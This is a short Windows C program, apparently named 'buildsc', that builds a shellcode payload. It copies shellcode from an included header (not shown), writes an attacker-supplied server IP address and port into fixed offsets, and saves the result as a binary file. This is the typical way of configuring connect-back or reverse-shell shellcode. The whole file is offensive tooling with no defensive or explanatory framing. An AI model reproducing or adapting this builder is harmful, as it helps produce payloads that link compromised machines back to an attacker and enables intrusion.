

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>
#include <winsock.h>

#pragma comment(lib, "ws2_32.lib")

#include "spz32.h"

int main(int argc, char *argv[]) 
{
  HANDLE  out;
  int   wr, n, i, j;
  void    *bin;
  uint8_t *p;
  char    *ip_addr, *port, *outfile;
  WSADATA wsa;
  
  WSAStartup (MAKEWORD(2,0), &wsa);
  
  if (argc!=4) {
    printf ("\nusage: buildsc <server ip address> <server port> <bin>\n");
    return 0;
  }
  
  ip_addr = argv[1];
  port    = argv[2];
  outfile = argv[3];
  
  out=CreateFile(outfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
  if (out==INVALID_HANDLE_VALUE) {
    printf ("unable to open %s\n", outfile);
    return 0;
  }
  bin=VirtualAlloc (0, text_SIZE, MEM_COMMIT, PAGE_READWRITE);
  if (bin!=NULL) 
  {
    p=(uint8_t*)bin;
    // copy the shellcode
    memcpy (p, text, text_SIZE);
    // set the port
    ((u_long*)(uint8_t*)(p+REMOTE_PORT))[0] = htons(atoi(port));
    // set the ip address
    ((u_long*)(uint8_t*)(p+REMOTE_ADDR))[0] = inet_addr(ip_addr);
    
    WriteFile (out, bin, text_SIZE, &wr, 0);
    VirtualFree (bin, text_SIZE, MEM_RELEASE);
  }
  CloseHandle(out);
  return 0;
}